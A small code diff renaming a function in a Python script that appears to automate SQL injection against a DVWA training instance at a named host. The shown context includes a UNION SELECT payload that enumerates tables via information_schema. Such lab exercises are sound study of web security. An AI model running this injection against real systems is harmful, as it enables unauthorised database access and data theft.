@@ -47,7 +47,7 @@ def get_allowed_databases() -> list:
     return allowed_databases
 
 
-def get_tables_from_database(database) -> list:
+def get_tables_of_database(database) -> list:
     form_url = "http://vps.flavioprofessor.com.br/dvwa/vulnerabilities/sqli/"
     query_to_inject = f"' UNION SELECT 1, TABLE_NAME FROM information_schema.tables where table_schema = '{database}'#"
     payload = {"id": query_to_inject, "Submit": "Submit"}
@@ -101,7 +101,7 @@ if __name__ == "__main__":
             input_message="Choose a database to explore: ",
         )
 
-        tables = get_tables_from_database(choosed_db)
+        tables = get_tables_of_database(choosed_db)
         choosed_table = render_menu(
             f"Find this tables on {choosed_db}: ",
             [table["name"] for table in tables],
